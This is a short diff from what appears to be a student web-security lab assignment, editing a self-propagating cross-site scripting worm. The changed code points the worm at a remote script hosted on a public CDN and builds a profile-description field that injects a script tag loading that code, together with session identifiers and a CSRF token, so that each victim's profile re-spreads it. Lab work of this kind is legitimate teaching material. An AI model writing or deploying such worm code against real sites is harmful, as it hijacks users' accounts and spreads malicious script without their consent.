@@ -33,7 +33,7 @@ window.onload = function() {
     }
 
     // Copy worm to victim's profile
-    var wormurl = document.currentScript.src;
+    var wormurl = "https://cdn.jsdelivr.net/gh/abdelhakeem/hs444-asg6@master/task6.js";
     content = `description=<script type="text/javascript" src="${wormurl}"></script>` +
         guid + ts + token;
 
